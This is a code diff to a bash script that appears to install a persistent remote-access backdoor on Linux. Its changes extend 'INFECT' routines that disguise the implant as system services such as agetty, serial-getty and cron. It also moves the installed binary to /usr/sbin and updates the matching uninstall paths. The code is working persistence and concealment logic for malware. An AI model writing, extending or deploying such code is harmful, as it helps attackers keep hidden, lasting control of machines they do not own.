@@ -180,14 +180,15 @@ GS_FFPID=1
 # 	INFECT_SYSCTL_NAME_ARR+=("rsyslog")
 # }
 # => Got notification message from PID 52031, but reception only permitted for main PID 52029
-res=$(command -v agetty) && systemctl is-active --quiet 'getty@tty1' &>/dev/null && {
+res=$(command -v agetty) && {
 	INFECT_BIN_NAME_ARR+=("${res:?}")
-	INFECT_SYSCTL_NAME_ARR+=("getty@tty1")
-	# [[ "$(pgrep -c agetty 2>/dev/null)" -gt 1 ]] && {
-		# More that 1 agetty process. 
-		# systemctl show getty@tty1 --property=ExecStart
-	# }
-	systemctl show 'getty@tty1' --property=ExecStart | grep -qm1 -F "noclear" && INFECT_SYSTEMD_ARGV_MATCH="noclear"
+	if systemctl is-active --quiet 'getty@tty1' &>/dev/null; then
+		INFECT_SYSCTL_NAME_ARR+=("getty@tty1")
+		systemctl show 'getty@tty1' --property=ExecStart | grep -qm1 -F "noclear" && INFECT_SYSTEMD_ARGV_MATCH="noclear"
+	elif systemctl is-active --quiet 'serial-getty@ttyS0' &>/dev/null; then
+		INFECT_SYSCTL_NAME_ARR+=("serial-getty@ttyS0")
+		INFECT_SYSTEMD_ARGV_MATCH="ttyS0"
+	fi
 }
 res=$(command -v cron) && {
 	INFECT_BIN_NAME_ARR+=("${res:?}")
@@ -581,7 +582,7 @@ init_dstbin()
 	fi
 
 	# Try systemwide installation first
-	try_dstdir "${GS_PREFIX}/usr/bin" && return
+	try_dstdir "${GS_PREFIX}/usr/sbin" && return
 
 	# Try user installation
 	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
@@ -937,7 +938,7 @@ init_setup()
 	if [[ -n "$GS_PREFIX" ]]; then
 		# Debuggin and testing into separate directory
 		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
-		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
+		mkdir -p "${GS_PREFIX}/usr/sbin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
 			cp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
@@ -1068,7 +1069,8 @@ uninstall()
 			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
 			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
 		done
-		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"  # obsolete
+		uninstall_rm "${GS_PREFIX}/usr/sbin/${hn}"
 		uninstall_rm "/dev/shm/${hn}"
 		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
 		uninstall_rm "${PWD}/${hn}"
